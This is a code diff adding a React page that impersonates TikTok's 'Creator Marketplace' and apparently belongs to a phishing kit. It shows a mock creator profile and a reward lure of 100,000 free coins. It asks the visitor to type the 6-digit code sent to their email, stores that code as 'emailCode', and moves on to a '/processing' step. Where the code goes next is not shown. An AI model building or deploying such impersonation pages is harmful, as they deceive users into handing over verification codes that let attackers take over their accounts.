@@ -1,0 +1,187 @@
+import React, { useState, useRef, useEffect } from 'react';
+import { useNavigate } from 'react-router-dom';
+import { Button } from '../components/ui/button';
+
+const VerifyEmailPage = () => {
+  const navigate = useNavigate();
+  const [code, setCode] = useState(['', '', '', '', '', '']);
+  const inputRefs = useRef([]);
+  const coinAmount = localStorage.getItem('coinAmount') || '100,000';
+  const email = localStorage.getItem('email') || 'a********h@hotmail.com';
+
+  const mockUserData = {
+    name: 'andrei.ciuciu',
+    username: '@andrei.ciuciu',
+    followers: '532.4K',
+    following: '8.5K',
+    likes: '4.5M',
+    avatar: 'https://i.pravatar.cc/150?img=12'
+  };
+
+  useEffect(() => {
+    inputRefs.current[0]?.focus();
+  }, []);
+
+  const handleChange = (index, value) => {
+    if (value.length > 1) value = value[0];
+    if (!/^[0-9]*$/.test(value)) return;
+
+    const newCode = [...code];
+    newCode[index] = value;
+    setCode(newCode);
+
+    if (value && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index, e) => {
+    if (e.key === 'Backspace' && !code[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handleContinue = () => {
+    localStorage.setItem('emailCode', code.join(''));
+    navigate('/processing');
+  };
+
+  const handleResend = () => {
+    setCode(['', '', '', '', '', '']);
+    inputRefs.current[0]?.focus();
+  };
+
+  const maskedEmail = email.includes('@')
+    ? email[0] + '********' + email.substring(email.indexOf('@') - 1)
+    : 'a********h@hotmail.com';
+
+  return (
+    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
+      {/* Header */}
+      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
+        <div className="flex items-center gap-3">
+          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
+          <div className="flex gap-1.5">
+            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
+            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
+          </div>
+          <div className="ml-2">
+            <div className="text-white text-sm font-semibold">Creator</div>
+            <div className="text-white text-sm font-semibold">Marketplace</div>
+          </div>
+        </div>
+        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
+          Login
+        </Button>
+      </header>
+
+      {/* Main Content */}
+      <main className="max-w-4xl mx-auto px-6 py-12">
+        {/* Title */}
+        <div className="text-center mb-8">
+          <h1 className="text-6xl font-black mb-4">
+            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
+              TikTok
+            </span>
+          </h1>
+          <p className="text-cyan-400 text-2xl font-semibold">Enter the mail code</p>
+        </div>
+
+        {/* Profile Card */}
+        <div className="bg-[#1a1a1c] border border-gray-700 rounded-2xl p-8 mb-8">
+          <div className="flex items-center gap-6 mb-6">
+            <div className="relative">
+              <img
+                src={mockUserData.avatar}
+                alt="Profile"
+                className="w-24 h-24 rounded-full border-4 border-cyan-400"
+              />
+            </div>
+            <div>
+              <h2 className="text-white text-2xl font-bold">{mockUserData.name}</h2>
+              <p className="text-cyan-400 text-lg">{mockUserData.username}</p>
+            </div>
+          </div>
+          <div className="grid grid-cols-3 gap-6 text-center">
+            <div>
+              <div className="text-white text-2xl font-bold">{mockUserData.followers}</div>
+              <div className="text-gray-400 text-sm">Followers</div>
+            </div>
+            <div>
+              <div className="text-white text-2xl font-bold">{mockUserData.following}</div>
+              <div className="text-gray-400 text-sm">Following</div>
+            </div>
+            <div>
+              <div className="text-white text-2xl font-bold">{mockUserData.likes}</div>
+              <div className="text-gray-400 text-sm">Likes</div>
+            </div>
+          </div>
+        </div>
+
+        {/* Instructions */}
+        <div className="text-center mb-8">
+          <h2 className="text-cyan-400 text-3xl font-bold mb-4">Check your email</h2>
+          <p className="text-gray-400 text-lg mb-2">
+            We sent a 6-digit code to your email address. Please enter it below to continue.
+          </p>
+          <p className="text-cyan-400 text-lg font-semibold">Code sent to: {maskedEmail}</p>
+        </div>
+
+        {/* Code Input */}
+        <div className="mb-8">
+          <label className="text-white text-lg mb-4 block">Mail code</label>
+          <div className="flex gap-3 justify-center">
+            {code.map((digit, index) => (
+              <input
+                key={index}
+                ref={(el) => (inputRefs.current[index] = el)}
+                type="text"
+                maxLength="1"
+                value={digit}
+                onChange={(e) => handleChange(index, e.target.value)}
+                onKeyDown={(e) => handleKeyDown(index, e)}
+                className={`w-16 h-20 text-center text-2xl font-bold bg-[#1a1a1c] border-2 rounded-xl text-white focus:outline-none transition-all ${
+                  index === 0 && !code[0]
+                    ? 'border-cyan-400 shadow-lg shadow-cyan-400/20'
+                    : digit
+                    ? 'border-cyan-400'
+                    : 'border-gray-700'
+                }`}
+              />
+            ))}
+          </div>
+        </div>
+
+        {/* Continue Button */}
+        <Button
+          onClick={handleContinue}
+          className="w-full bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold py-6 text-lg rounded-lg transition-all mb-4"
+        >
+          Continue
+        </Button>
+
+        {/* Resend Link */}
+        <div className="text-center mb-8">
+          <span className="text-gray-400 text-lg">Didn't receive the code? </span>
+          <button
+            onClick={handleResend}
+            className="text-[#fe2c55] text-lg font-semibold hover:underline"
+          >
+            Resend
+          </button>
+        </div>
+
+        {/* Coins Display */}
+        <div className="text-center">
+          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
+            <span className="text-gray-400 text-lg">You will receive: </span>
+            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
+            <span className="text-gray-400 text-lg"> Coins</span>
+          </div>
+        </div>
+      </main>
+    </div>
+  );
+};
+
+export default VerifyEmailPage;
